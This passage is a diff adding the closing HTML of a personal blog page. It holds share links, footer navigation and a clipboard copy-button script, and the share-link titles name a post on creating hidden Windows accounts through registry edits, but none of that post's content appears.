+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&name=权限维持：Windows命令行下通过修改注册表创建隐藏帐号&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&t=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
